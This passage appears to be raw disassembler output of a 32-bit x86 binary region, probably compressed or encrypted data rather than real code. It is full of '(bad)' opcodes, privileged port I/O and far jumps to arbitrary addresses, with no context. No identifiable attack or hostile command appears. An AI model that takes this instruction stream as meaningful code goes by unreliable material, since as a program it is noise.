  41dafb:	mov    dh,0x47
  41dafd:	(bad)  
  41dafe:	jmp    0xbd57:0xb3e914b4
  41db05:	(bad)  
  41db06:	loope  0x41da98
  41db08:	jmp    0x41daa3
  41db0a:	jge    0x41db1b
  41db0c:	cmp    al,0xe3
  41db0e:	int3   
  41db0f:	pop    esp
  41db10:	into   
  41db11:	xor    DWORD PTR [ebx+0x3f2df2c9],ecx
  41db17:	jmp    0x41daec
  41db19:	and    ebx,ebp
  41db1b:	mov    ah,0x8
  41db1d:	jns    0x41dacb
  41db1f:	adc    edx,eax
  41db21:	repnz dec eax
  41db23:	shl    BYTE PTR ds:0xa6d8019c,0xea
  41db2a:	inc    ebx
  41db2b:	sbb    BYTE PTR [esi],dl
  41db2d:	packuswb mm6,QWORD PTR [ecx+0x16]
  41db31:	pop    esi
  41db32:	mov    esi,DWORD PTR [edx]
  41db34:	out    dx,eax
  41db35:	mov    cl,0x4e
  41db37:	mov    DWORD PTR [ebx],esp
  41db39:	in     eax,0x43
  41db3b:	(bad)  
  41db3c:	stos   DWORD PTR es:[edi],eax
  41db3d:	jne    0x41dac8
  41db3f:	and    eax,0x8ce07399
  41db44:	jecxz  0x41db36
  41db46:	push   ss
  41db47:	xchg   edx,eax
  41db48:	fld    QWORD PTR [esi]
  41db4a:	push   ebx
  41db4b:	add    edx,DWORD PTR [eax-0x7d]
  41db4e:	fimul  DWORD PTR ds:0xdcafcdea
  41db54:	shl    DWORD PTR [ebp+0x7a],0x6a
  41db58:	retw   0x2dde
  41db5c:	popa   
  41db5d:	pop    ebx
  41db5e:	mov    eax,0x82816c3f
  41db63:	sub    DWORD PTR [esi+0xf0d789c],esi
  41db69:	inc    ebx
  41db6a:	or     al,0xcd
  41db6c:	mov    ch,0xe3
  41db6e:	arpl   WORD PTR [esi+0x7d67c09],ax
  41db74:	jg     0x41dba2
  41db76:	outs   dx,BYTE PTR ds:[esi]
  41db77:	addr16 clc 
  41db79:	outs   dx,BYTE PTR ds:[esi]
  41db7a:	ror    edx,cl
  41db7c:	mov    ecx,0xe5cc109e
  41db81:	mov    ebp,0xe7cd5f31
  41db86:	jg     0x41db4e
  41db88:	ss inc esp
  41db8a:	outs   dx,BYTE PTR ds:[esi]
  41db8b:	xor    eax,0xd40444c5
  41db90:	leave  
  41db91:	dec    ebx
  41db92:	imul   ecx,DWORD PTR [ecx-0x31629258],0x65
  41db99:	jge    0x41dbb0
  41db9b:	lods   al,BYTE PTR ds:[esi]
  41db9c:	pop    ebp
  41db9d:	arpl   WORD PTR [edx+eiz*8-0x53],bp
  41dba1:	fs dec eax
  41dba3:	mov    eax,ds:0x6b94255
  41dba8:	and    DWORD PTR [ecx+0x280af8d2],edx
  41dbae:	call   0x859afcf0
  41dbb3:	enter  0x4d9f,0x2e
  41dbb7:	retf   0xca06
  41dbba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbbb:	jl     0x41db4e
  41dbbd:	imul   edx,DWORD PTR [eax-0x6f],0xab0aa90e
  41dbc4:	sub    edx,ebp
  41dbc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbc7:	pop    ss
  41dbc8:	ins    DWORD PTR es:[edi],dx
  41dbc9:	xchg   edx,eax
  41dbca:	ja     0x41dc01
  41dbcc:	cmp    al,0x2d
  41dbce:	sub    ebp,edx
  41dbd0:	dec    ecx
  41dbd1:	or     ch,BYTE PTR ds:0x5bc96945
  41dbd7:	inc    ebp
  41dbd8:	sti    
  41dbd9:	pusha  
  41dbda:	sub    eax,0x3d967a2a
  41dbdf:	loope  0x41dbc5
  41dbe1:	cli    
  41dbe2:	(bad)  
  41dbe4:	or     edx,DWORD PTR [ecx-0x6b]
  41dbe7:	mov    bh,0xe1
  41dbe9:	ins    DWORD PTR es:[edi],dx
  41dbea:	ins    BYTE PTR es:[edi],dx
  41dbeb:	daa    
  41dbec:	inc    edx
  41dbed:	mov    al,ds:0x4f682847
  41dbf2:	and    esi,DWORD PTR [edi-0x15b04d6d]
  41dbf8:	fmul   DWORD PTR [esi+0x64]
  41dbfb:	(bad)  
  41dbfc:	fdiv   QWORD PTR [edx-0x44c8efbf]
  41dc02:	xlat   BYTE PTR ds:[ebx]
  41dc03:	retf   
  41dc04:	sub    al,0x74
  41dc06:	arpl   WORD PTR [edx-0x5],bp
  41dc09:	xchg   DWORD PTR [ecx+0x75436e57],edi
  41dc0f:	xchg   esi,eax
  41dc10:	mov    bh,0x5
  41dc12:	jl     0x41dc49
  41dc14:	retf   0xa14
  41dc17:	xor    al,0x2f
  41dc19:	(bad)  
  41dc1a:	xchg   ebp,eax
  41dc1b:	jnp    0x41dc61
  41dc1d:	fidivr DWORD PTR [ebp-0x4b6e3a12]
  41dc23:	scas   eax,DWORD PTR es:[edi]
  41dc24:	mov    bl,BYTE PTR [edx-0x47]
  41dc27:	inc    esi
  41dc28:	inc    ecx
  41dc29:	mov    edi,DWORD PTR [ebx-0x42]
  41dc2c:	add    dl,cl
  41dc2e:	jg     0x41dc51
  41dc30:	lds    eax,FWORD PTR [ebx-0x4156eab8]
  41dc36:	jmp    0xd0a0:0xd600b106
  41dc3d:	dec    ebp
  41dc3e:	cdq    
  41dc3f:	xlat   BYTE PTR ds:[ebx]
  41dc40:	or     bl,bh
  41dc42:	and    DWORD PTR [esi-0x24bcdb3a],eax
  41dc48:	mov    esi,0xb41e95e0
  41dc4d:	loopne 0x41dc6e
  41dc4f:	out    0x65,eax
  41dc51:	outs   dx,BYTE PTR ds:[esi]
  41dc52:	or     BYTE PTR ds:0x2abe4b6,dh
  41dc58:	jnp    0x41dc8f
  41dc5a:	int    0xd3
  41dc5c:	and    DWORD PTR [esi],edx
  41dc5e:	in     al,0xc1
  41dc60:	mov    ds:0x1365fe86,al
  41dc65:	(bad)
  41dc68:	inc    edi
  41dc69:	jne    0x41dc95
  41dc6b:	xor    eax,0x8c79bd19
  41dc70:	sar    DWORD PTR [ecx+0x291fddc7],0xdc
  41dc77:	jp     0x41dca4
  41dc79:	xchg   edi,eax
  41dc7a:	mov    ebp,0xd2049766
  41dc7f:	call   0xd0419728
  41dc84:	ins    DWORD PTR es:[edi],dx
  41dc85:	mov    DWORD PTR [ebp+0x7a],edx
  41dc88:	test   al,0x8b
  41dc8a:	loop   0x41dcf7
  41dc8c:	clc    
  41dc8d:	ins    DWORD PTR es:[edi],dx
  41dc8e:	add    eax,0x9fc9eac6
  41dc93:	pop    edx
  41dc94:	scas   al,BYTE PTR es:[edi]
  41dc95:	mov    esp,esi
  41dc97:	mov    esi,0x590ca71b
  41dc9c:	pop    eax
  41dc9d:	push   esi
  41dc9e:	sub    DWORD PTR [edi],ebx
  41dca0:	in     eax,dx
  41dca1:	sbb    bh,ch
  41dca3:	lods   eax,DWORD PTR ds:[esi]
  41dca4:	add    DWORD PTR [ebx+0x0],ebx
  41dca7:	fdiv   DWORD PTR [eax-0x39]
  41dcaa:	leave  
  41dcab:	inc    edx
  41dcac:	inc    esi
  41dcad:	inc    eax
  41dcae:	inc    edx
  41dcaf:	rcr    BYTE PTR [edx+0x90d869b],cl
  41dcb5:	and    al,0x32
  41dcb7:	inc    bx
  41dcb9:	inc    eax
  41dcba:	pop    ds
  41dcbb:	hlt    
  41dcbc:	cmp    DWORD PTR [esi],ecx
  41dcbe:	xor    bl,BYTE PTR [eax-0x13]
  41dcc1:	sbb    al,0xed
  41dcc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcc4:	lea    esi,[esi-0x1afd3a57]
  41dcca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dccb:	jmp    0x80dbc366
  41dcd0:	ret    
  41dcd1:	add    ebp,DWORD PTR [esi-0x3e]
  41dcd4:	sub    edx,DWORD PTR [ebx]
  41dcd6:	inc    ecx
  41dcd7:	mov    edx,0xbd0a591
  41dcdc:	xchg   ebp,eax
  41dcdd:	fadd   QWORD PTR [eax-0x32]
  41dce0:	sub    eax,0x1c63d171
  41dce5:	pop    eax
  41dce6:	into   
  41dce7:	mov    ebx,ebp
  41dce9:	in     al,dx
  41dcea:	test   eax,0xf164405e
  41dcef:	mov    ecx,0xd5360ece
  41dcf4:	mov    ah,0x8a
  41dcf6:	lahf   
  41dcf7:	outs   dx,DWORD PTR ds:[esi]
  41dcf8:	pop    ebx
  41dcf9:	mov    ch,0x84
  41dcfb:	pop    eax
  41dcfc:	xchg   ebx,eax
  41dcfd:	stc    
  41dcfe:	jmp    0xdab4:0x40b44543
  41dd05:	sub    edi,0x624da6e
  41dd0b:	adc    esi,edi
  41dd0d:	test   dl,0x29
  41dd10:	and    DWORD PTR [esi+ecx*1+0x40],ebp
  41dd14:	and    BYTE PTR [ebx],dl
  41dd16:	pop    ebx
  41dd17:	pop    esp
  41dd18:	mov    bh,0xa4
  41dd1a:	pop    ecx
  41dd1b:	fld    QWORD PTR ds:0xcce22155
  41dd21:	popf   
  41dd22:	jb     0x41dd49
  41dd24:	shl    DWORD PTR [edi+0x940de84],cl
  41dd2a:	jmp    0x363ea7
  41dd2f:	inc    eax
  41dd30:	push   0x1341f434
  41dd35:	inc    ecx
  41dd36:	mov    ebp,0xd3ce6243
  41dd3b:	aaa    
  41dd3c:	xor    bh,BYTE PTR [ecx]
  41dd3e:	fist   WORD PTR [ecx+0x3fa43265]
  41dd44:	mov    ebx,0xa4d4e9a3
  41dd49:	xchg   DWORD PTR [ecx],edx
  41dd4b:	or     BYTE PTR [eax-0x5a],ch
  41dd4e:	add    esi,DWORD PTR [edi]
  41dd50:	sub    eax,0xcabaa55d
  41dd55:	cmc    
  41dd56:	aad    0xd
  41dd58:	dec    edx
  41dd59:	jae    0x41dcfb
  41dd5b:	cwde   
  41dd5c:	push   ebp
  41dd5d:	inc    edx
  41dd5e:	jno    0x41ddc8
  41dd60:	jnp    0x41ddd2
  41dd62:	stos   DWORD PTR es:[edi],eax
  41dd63:	or     al,bl
  41dd65:	pop    ecx
  41dd66:	add    DWORD PTR [ecx],ebp
  41dd68:	push   ebp
  41dd69:	mov    ds:0x735afa61,eax
  41dd6e:	sbb    BYTE PTR [edx+0x74],bl
  41dd71:	jg     0x41ddaa
  41dd73:	sub    eax,0xddabab3c
  41dd78:	push   edx
  41dd79:	repz jmp 0x984797f9
  41dd7f:	(bad)  
  41dd81:	das    
  41dd82:	lea    esp,[edi+eiz*2+0x3f485bf7]
  41dd89:	mov    edx,0xfc89eacf
  41dd8e:	jnp    0x41dd1f
  41dd90:	in     eax,dx
  41dd91:	scas   al,BYTE PTR es:[edi]
  41dd92:	xor    al,0xb
  41dd94:	pop    ebx
  41dd95:	ja     0x41ddc2
  41dd97:	mov    esp,0xe7c441ea
  41dd9c:	push   edi
  41dd9d:	je     0x41dd27
  41dd9f:	push   edx
  41dda0:	and    al,0x1f
  41dda2:	dec    edx
  41dda3:	sbb    al,0x51
  41dda5:	mov    bl,0x67
  41dda7:	xchg   BYTE PTR [edi+0x91b2e63],bh
  41ddad:	call   0x2479:0x52e7a0c1
  41ddb4:	ficomp WORD PTR [ebx+0x755d94d1]
  41ddba:	inc    esi
  41ddbb:	inc    esp
  41ddbc:	pop    DWORD PTR [edx-0x7416ef58]
  41ddc2:	cmp    eax,DWORD PTR [esi]
  41ddc4:	xor    ah,dh
  41ddc6:	sub    al,0x7b
  41ddc8:	ds das 
  41ddca:	jecxz  0x41ddd8
  41ddcc:	pushf  
  41ddcd:	cmp    eax,DWORD PTR [esi+0x6f]
  41ddd0:	imul   BYTE PTR [eax]
  41ddd2:	sub    BYTE PTR [ecx],0x66
  41ddd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddd6:	jecxz  0x41de3f
  41ddd8:	das    
  41ddd9:	call   0xefea:0x5041e3da
  41dde0:	retf   0x8d04
  41dde3:	jbe    0x41ddf0
  41dde5:	and    DWORD PTR [edx+0x252c7132],esp
  41ddeb:	dec    edi
  41ddec:	inc    ebp
  41dded:	add    DWORD PTR [ecx-0x3f851145],0xffffffb5
  41ddf4:	ja     0x41de34
  41ddf6:	or     dl,BYTE PTR [edi]
  41ddf8:	sub    BYTE PTR [eax-0x59],0x60
  41ddfc:	mov    dh,0x30
  41ddfe:	(bad)  
  41ddff:	mov    esi,?
  41de01:	dec    edx
  41de02:	pushf  
  41de03:	dec    ebx
  41de04:	mov    esi,0x33f09529
  41de09:	add    eax,0x5346049a
  41de0e:	mov    ds:0x2383559b,eax
  41de13:	std    
  41de14:	adc    eax,0xa10320ee
  41de19:	ds dec ebx
  41de1b:	cs sub eax,0xb6762bce
  41de21:	repnz retf 
  41de23:	repz popa 
  41de25:	bnd jno 0x41ddaa
  41de28:	rcr    ch,0x95
  41de2b:	out    dx,al
  41de2c:	stos   BYTE PTR es:[edi],al
  41de2d:	inc    esp
  41de2e:	jne    0x41de52
  41de30:	or     ebp,DWORD PTR [edx+0x2d0570fc]
  41de36:	and    BYTE PTR [esi+ebp*8-0x2cac9c82],al
  41de3d:	push   eax
  41de3e:	add    esp,DWORD PTR ds:0x3e2d8818
  41de44:	add    dh,BYTE PTR [edi+0x2c]
  41de47:	xlat   BYTE PTR ds:[ebx]
  41de48:	addr16 ret 0x96d3
  41de4c:	lods   eax,DWORD PTR ds:[esi]
  41de4d:	leave  
  41de4e:	jns    0x41de43
  41de50:	test   al,0xdf
  41de52:	cli    
  41de53:	mov    esi,0x19312556
  41de58:	(bad)  
  41de59:	and    DWORD PTR [edx+0x39bcb12f],eax
  41de5f:	jne    0x41de3e
  41de61:	push   ebx
  41de62:	loope  0x41de82
  41de64:	cmp    al,bh
  41de66:	jge    0x41de76
  41de68:	out    dx,al
  41de69:	pop    ds
  41de6a:	add    DWORD PTR [esi],eax
  41de6c:	(bad)  
  41de6e:	rol    BYTE PTR [ebp+0x3e],1
  41de71:	mov    ebx,0x238ad70a
  41de76:	xchg   esp,eax
  41de77:	sbb    eax,0x23926841
  41de7c:	xchg   BYTE PTR [eax],ah
  41de7e:	jl     0x41de06
  41de80:	push   esi
  41de81:	mov    eax,ds:0x62a091e8
  41de86:	std    
  41de87:	push   esp
  41de88:	dec    edi
  41de89:	or     bh,al
  41de8b:	and    BYTE PTR [ebp+0x11],bl
  41de8e:	repz inc eax
  41de90:	loope  0x41deff
  41de92:	jb     0x41dedb
  41de94:	in     eax,dx
  41de95:	shl    BYTE PTR [ecx+0x297123c],0xf2
  41de9c:	aas    
  41de9d:	js     0x41de24
  41de9f:	(bad)  [ecx+0x61]
  41dea2:	lods   eax,DWORD PTR ds:[esi]
  41dea3:	xor    DWORD PTR [ecx-0x1d169c5f],esi
  41dea9:	ja     0x41deb6
  41deab:	sbb    BYTE PTR [eax-0x4],al
  41deae:	sbb    cl,ah
  41deb0:	stos   DWORD PTR es:[edi],eax
  41deb1:	imul   esp,DWORD PTR [ecx],0x61
  41deb4:	inc    ecx
  41deb5:	mov    esp,DWORD PTR [edi+0x51a655ec]
  41debb:	adc    esp,DWORD PTR ds:0xc2628079
  41dec1:	(bad)  
  41dec2:	fdivr  DWORD PTR [ecx+0x69b03808]
  41dec8:	(bad)  
  41dec9:	pop    esi
  41deca:	pushf  
  41decb:	lahf   
  41decc:	adc    esi,0x7272154b
  41ded2:	loop   0x41df3d
  41ded4:	in     al,dx
  41ded5:	out    0x5d,eax
  41ded7:	xor    ah,0xfc
  41deda:	xlat   BYTE PTR ds:[ebx]
  41dedb:	shr    DWORD PTR [edx+0x2a],1
  41dede:	into   
  41dedf:	loopne 0x41df07
  41dee1:	mov    WORD PTR [ebx+eiz*4-0xb],fs
  41dee5:	loop   0x41def0
  41dee7:	jge    0x41df42
  41dee9:	test   eax,0x7b3182f6
  41deee:	fbld   TBYTE PTR [ebp-0x2f9e6617]
  41def4:	xchg   al,ah
  41def6:	lea    edx,[eax]
  41def8:	sub    BYTE PTR [ebx+0x4c],bh
  41defb:	jb     0x41debd
  41defd:	imul   edi,ebp,0xb2e53a6
  41df03:	retf   
  41df04:	lods   eax,DWORD PTR ds:[esi]
  41df05:	mov    ebp,0xa308f18
  41df0a:	aaa    
  41df0b:	jb     0x41deb6
  41df0d:	(bad)  
  41df0e:	xchg   ebp,eax
  41df0f:	sub    DWORD PTR [ebx+ebp*2-0x3d18a6b5],ebx
  41df16:	mov    es,edi
  41df18:	xlat   BYTE PTR ds:[ebx]
  41df19:	lods   al,BYTE PTR ds:[esi]
  41df1a:	lahf   
  41df1b:	mov    WORD PTR [esi],ds
  41df1d:	call   0x322e8d77
  41df22:	mov    eax,ds:0x2c595c22
  41df27:	clc    
  41df28:	aas    
  41df29:	popfw  
  41df2b:	daa    
  41df2c:	popa   
  41df2d:	inc    edx
  41df2e:	cmc    
  41df2f:	gs inc edi
  41df31:	les    ecx,FWORD PTR [edi]
  41df33:	cli    
  41df34:	jg     0x41dfa9
  41df36:	leave  
  41df37:	in     eax,dx
  41df38:	sub    esi,DWORD PTR [edi+0x6a]
  41df3b:	inc    ebx
  41df3c:	push   edi
  41df3d:	push   ecx
  41df3e:	cmp    al,0x78
  41df40:	mov    ebp,0xa44506e2
  41df45:	cmp    al,0xee
  41df47:	adc    al,0xf5
  41df49:	mov    eax,ds:0x8dc87c7c
  41df4e:	inc    ebx
  41df4f:	mov    ds,WORD PTR [ebx-0x357c893]
  41df55:	and    ebp,esi
  41df57:	and    dh,BYTE PTR [ebx+0x3f]
  41df5a:	dec    esp
  41df5b:	out    0x18,al
  41df5d:	sub    ch,BYTE PTR [esi]
  41df5f:	aaa    
  41df60:	pop    ds
  41df61:	scas   al,BYTE PTR es:[edi]
  41df62:	sti    
  41df63:	call   0xaaee463e
  41df68:	test   al,0x9
  41df6a:	mov    ecx,0x263a11d7
  41df6f:	ret    
  41df70:	ja     0x41df02
  41df72:	mov    eax,DWORD PTR [edi+0x43e23de8]
  41df78:	repnz fs ds dec esi
  41df7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7d:	(bad)  
  41df7e:	test   al,0x30
  41df80:	mov    al,ds:0xec6b3250
  41df85:	sti    
  41df86:	mov    esp,0xdc8ea0f3
  41df8b:	and    al,0x56
  41df8d:	add    al,0x3c
  41df8f:	mov    edx,0xe902d60
  41df94:	or     dl,BYTE PTR [ebx+0x74]
  41df97:	loopne 0x41df56
  41df99:	cli    
  41df9a:	call   0xe1af753a
  41df9f:	lods   al,BYTE PTR ds:[esi]
  41dfa0:	ret    
  41dfa1:	jle    0x41dfa7
  41dfa3:	aad    0x26
  41dfa5:	jo     0x41dfa5
  41dfa7:	pop    ebp
  41dfa8:	ins    DWORD PTR es:[edi],dx
  41dfa9:	fstp   QWORD PTR [ecx+0xcd52e1a]
  41dfaf:	inc    edi
  41dfb0:	dec    edi
  41dfb1:	test   eax,0x59b5ec6
  41dfb6:	add    BYTE PTR [edx],ch
  41dfb8:	cmp    eax,0x6cf13391
  41dfbd:	and    cl,BYTE PTR [ebx]
  41dfbf:	or     eax,0x7941889f
  41dfc4:	dec    edi
  41dfc5:	dec    ecx
  41dfc6:	add    ebx,0xffffffc4
  41dfc9:	adc    al,0x33
  41dfcb:	rcr    DWORD PTR [edx-0x647fc2c4],1
  41dfd1:	dec    esi
  41dfd2:	popa   
  41dfd3:	and    al,0x29
  41dfd5:	adc    eax,DWORD PTR [ecx]
  41dfd7:	lock cs sub al,0x4e
  41dfdb:	fwait
  41dfdc:	mov    al,ds:0x69b36764
  41dfe1:	nop
  41dfe2:	into   
  41dfe3:	jne    0x41dff9
  41dfe5:	ficom  DWORD PTR [edi]
  41dfe7:	mov    bh,0x98
  41dfe9:	inc    ebp
  41dfea:	xor    BYTE PTR [esi],ah
  41dfec:	or     BYTE PTR [esi-0x36],0x47
  41dff0:	sbb    DWORD PTR [ebp-0x12],0xffffff82
  41dff4:	in     al,dx
  41dff5:	jp     0x41e02b
  41dff7:	push   ds
  41dff8:	xlat   BYTE PTR ds:[ebx]
  41dff9:	inc    ecx
  41dffa:	(bad)  
  41dffb:	mov    BYTE PTR ds:0xaf398ecb,ah
  41e001:	stc    
  41e002:	push   es
  41e003:	pop    es
  41e004:	mov    al,BYTE PTR [edi]
  41e006:	pop    eax
  41e007:	nop
  41e008:	push   ecx
  41e009:	(bad)  
  41e00a:	not    al
  41e00c:	push   cs
  41e00d:	imul   ebx,eax,0x11
  41e010:	rcr    ebx,1
  41e012:	popf   
  41e013:	sub    bh,dl
  41e015:	sbb    ah,al
  41e017:	test   DWORD PTR [ebp+ebx*8-0x8c80672],0xfbdb761
  41e022:	adc    al,0xf5
  41e024:	sar    DWORD PTR [ebx+0x7e],1
  41e027:	mov    es,WORD PTR [ebx+0x47]
  41e02a:	in     eax,0x89
  41e02c:	xor    esi,DWORD PTR [ebx-0x54]
  41e02f:	ret    0xda56
  41e032:	pop    edi
  41e033:	gs mov dh,0x9b
  41e036:	aaa    
  41e037:	pop    edx
  41e038:	and    al,0xa8
  41e03a:	and    cl,BYTE PTR [ecx]
  41e03c:	std    
  41e03d:	sti    
  41e03e:	push   ds
  41e03f:	loopne 0x41e019
  41e041:	dec    esi
  41e042:	mov    cl,0x57
  41e044:	mov    bh,0x86
  41e046:	mul    DWORD PTR [edi]
  41e048:	sub    ah,cl
  41e04a:	ins    BYTE PTR es:[edi],dx
  41e04b:	into   
  41e04c:	cmp    ah,ah
  41e04e:	shl    dl,1
  41e050:	xchg   ecx,eax
  41e051:	fild   QWORD PTR [ecx+0x7c]
  41e054:	xlat   BYTE PTR ds:[ebx]
  41e055:	xor    eax,ebp
  41e057:	fstp   DWORD PTR [esi]
  41e059:	add    al,BYTE PTR ds:0xbeb5b8f1
  41e05f:	adc    eax,0x5d64d915
  41e064:	loope  0x41e036
  41e066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e067:	pop    eax
  41e068:	cs stos DWORD PTR es:[edi],eax
  41e06a:	xor    ebp,DWORD PTR [ecx+ecx*8]
  41e06d:	inc    edx
  41e06e:	adc    bh,cl
  41e070:	imul   ecx,DWORD PTR [ebx+0x40],0xdabf447a
  41e077:	sar    BYTE PTR [ebp-0x34],cl
  41e07a:	or     ch,BYTE PTR [esi-0xd]
  41e07d:	inc    ebp
  41e07e:	xchg   esi,eax
  41e07f:	mov    dl,0x1
  41e081:	xchg   esp,eax
  41e082:	sbb    bh,BYTE PTR [ebx+0x24ea2935]
  41e088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e089:	je     0x41e00c
  41e08b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e08c:	sbb    eax,0x14203601
  41e091:	idiv   DWORD PTR [ebx]
  41e093:	sbb    eax,0x92e1c1f8
  41e098:	shr    BYTE PTR [edi+0x35],cl
  41e09b:	lods   al,BYTE PTR ds:[esi]
  41e09c:	cmp    ebx,DWORD PTR [edx]
  41e09e:	out    dx,eax
  41e09f:	call   0xa2e:0xf8008df3
  41e0a6:	int    0x17
  41e0a8:	inc    esp
  41e0a9:	mov    ebp,0x87f4419d
  41e0ae:	pusha  
  41e0af:	mov    ecx,DWORD PTR [edx+0x1bcbba5]
  41e0b5:	scas   al,BYTE PTR es:[edi]
  41e0b6:	out    0xb1,al
  41e0b8:	sbb    eax,0x8db33d26
  41e0bd:	or     eax,0xb83dee89
  41e0c2:	cmp    al,BYTE PTR [ecx+0x3e]
  41e0c5:	(bad)  
  41e0c6:	xor    DWORD PTR [ebx],ebp
  41e0c8:	into   
  41e0c9:	data16 out 0x47,al
  41e0cc:	jg     0x41e079
  41e0ce:	popa   
  41e0cf:	push   eax
  41e0d0:	daa    
  41e0d1:	out    dx,eax
  41e0d2:	dec    ebp
  41e0d3:	imul   eax,DWORD PTR [ecx],0xffffff86
  41e0d6:	mov    dl,0x4a
  41e0d8:	aaa    
  41e0d9:	cmp    al,0xce
  41e0db:	mov    esi,0xd66f71c0
  41e0e0:	push   0xffffffd8
  41e0e2:	stos   BYTE PTR es:[edi],al
  41e0e3:	or     DWORD PTR [ebp+0x3c],ecx
  41e0e6:	lock adc dl,0xec
  41e0ea:	inc    ecx
  41e0eb:	sbb    cl,bh
  41e0ed:	out    dx,eax
  41e0ee:	outs   dx,DWORD PTR ds:[esi]
  41e0ef:	sahf   
  41e0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f1:	inc    eax
  41e0f2:	adc    BYTE PTR [ebp+0x62],cl
  41e0f5:	gs push 0xa999cf
  41e0fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0fc:	fwait
  41e0fd:	addr16 pop ebp
  41e0ff:	lahf   
  41e100:	or     DWORD PTR [ebx+0x6dd5faad],0x76
  41e107:	mov    ds:0x6dc1d2b9,eax
  41e10c:	xchg   ebx,eax
  41e10d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41e10f:	mov    esi,0x963f11bc
  41e114:	jb     0x41e0ed
  41e116:	push   cs
  41e117:	push   esp
  41e118:	or     edx,DWORD PTR [edx]
  41e11a:	stos   BYTE PTR es:[edi],al
  41e11b:	out    0x72,al
  41e11d:	fidiv  DWORD PTR [edi+0x6db44b20]
  41e123:	sub    BYTE PTR [eax+0x39],cl
  41e126:	sub    eax,0xf0052b3e
  41e12b:	int3   
  41e12c:	mov    al,0x57
  41e12e:	sbb    edx,DWORD PTR [ebx+0x4]
  41e131:	mov    cl,0x9a
  41e133:	sbb    ebp,ebx
  41e135:	int    0xad
  41e137:	sub    BYTE PTR [esi-0x78],0xdb
  41e13b:	push   ebp
  41e13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e13d:	(bad)  
  41e13e:	and    al,0x53
  41e140:	stos   BYTE PTR es:[edi],al
  41e141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e142:	fisttp DWORD PTR [ebp-0x10fb3dbb]
  41e148:	mov    cl,0xf6
  41e14a:	mov    dl,0x33
  41e14c:	jecxz  0x41e1b1
  41e14e:	and    DWORD PTR [esi],0xa600a88c
  41e154:	mov    bl,0x59
  41e156:	fs cmc 
  41e158:	inc    ebp
  41e159:	pop    ss
  41e15a:	jbe    0x41e130
  41e15c:	jg     0x41e16b
  41e15e:	loop   0x41e136
  41e160:	lds    ebp,FWORD PTR [ecx]
  41e162:	sbb    eax,0xb115d5f8
  41e167:	lods   eax,DWORD PTR ds:[esi]
  41e168:	fsubr  st,st(7)
  41e16a:	jg     0x41e127
  41e16c:	cmp    BYTE PTR [ecx+0x70c69ec],al
  41e172:	push   cs
  41e173:	pop    edx
  41e174:	sub    BYTE PTR [edx],cl
  41e176:	icebp  
  41e177:	leave  
  41e178:	pop    eax
  41e179:	push   ebx
  41e17a:	push   ds
  41e17b:	sbb    al,BYTE PTR [eax]
  41e17d:	loope  0x41e1bb
  41e17f:	mov    DWORD PTR [edi-0x65],ecx
  41e182:	les    edx,FWORD PTR [ebp+0x59]
  41e185:	mov    WORD PTR [edi+0x48],gs
  41e188:	mov    dh,0x16
  41e18a:	shl    BYTE PTR [eax-0x78],cl
  41e18d:	mov    ecx,0x6ab32f43
  41e192:	fwait
  41e193:	(bad)  
  41e194:	lock inc edx
  41e196:	inc    edi
  41e197:	jl     0x41e194
  41e199:	xchg   esp,eax
  41e19a:	inc    edi
  41e19b:	ret    0x436c
  41e19e:	mov    edx,?
  41e1a0:	sahf   
  41e1a1:	sub    BYTE PTR [eax-0x64966861],dh
  41e1a7:	in     al,dx
  41e1a8:	mov    ds:0x3cbb9d00,al
  41e1ad:	lea    edi,[edx-0x66bf73fd]
  41e1b3:	mov    DWORD PTR [eax-0x42bcf005],eax
  41e1b9:	aas    
  41e1ba:	adc    DWORD PTR [ebx-0xafb4938],esp
  41e1c0:	mov    dl,0x3f
  41e1c2:	mov    cx,0xf27d
  41e1c6:	shl    DWORD PTR [ebx+0x3de332e0],1
  41e1cc:	inc    eax
  41e1cd:	jle    0x41e1f4
  41e1cf:	shr    eax,1
  41e1d1:	lods   eax,DWORD PTR ds:[esi]
  41e1d2:	mov    ah,0x8d
  41e1d4:	and    eax,0x223eaca
  41e1d9:	call   0xd557:0x3d50dfe9
  41e1e0:	jle    0x41e250
  41e1e2:	pusha  
  41e1e3:	jae    0x41e1f3
  41e1e5:	retf   
  41e1e6:	xor    edx,DWORD PTR [edi]
  41e1e8:	out    dx,eax
  41e1e9:	popf   
  41e1ea:	push   edi
  41e1eb:	cmp    al,BYTE PTR [ebp-0x27]
  41e1ee:	mov    ecx,0x76178fa6
  41e1f3:	cmc    
  41e1f4:	rol    BYTE PTR [eax+0x1e552c6e],cl
  41e1fa:	and    edi,DWORD PTR [edx]
  41e1fc:	mulps  xmm0,XMMWORD PTR [edx+0x23]
  41e200:	mov    al,ds:0x8eee5c28
  41e205:	nop
  41e206:	xchg   BYTE PTR [eax+0x77],ch
  41e209:	add    ecx,DWORD PTR [ecx+0x32ced2c]
  41e20f:	loop   0x41e227
  41e211:	int    0x4c
  41e213:	mov    al,0x8f
  41e215:	ja     0x41e202
  41e217:	sbb    edx,esi
  41e219:	fldcw  WORD PTR [edi]
  41e21b:	popa   
  41e21c:	mov    BYTE PTR [eax-0x2d],ah
  41e21f:	gs add eax,esp
  41e222:	adc    DWORD PTR [ebp-0x74],eax
  41e225:	mov    esp,0xc136fb3c
  41e22a:	sub    al,BYTE PTR [ebp+0x57]
  41e22d:	pop    esi
  41e22e:	dec    ecx
  41e22f:	retf   0xbb71
  41e232:	test   DWORD PTR [ecx],ebp
  41e234:	mov    esi,0xfe75463a
  41e239:	xor    dl,0x62
  41e23c:	arpl   WORD PTR [ebx-0x80],bp
  41e23f:	repnz or eax,0x721c2d39
  41e245:	xchg   ebx,eax
  41e246:	sbb    al,0xe0
  41e248:	outs   dx,BYTE PTR ds:[esi]
  41e249:	call   0x39870dac
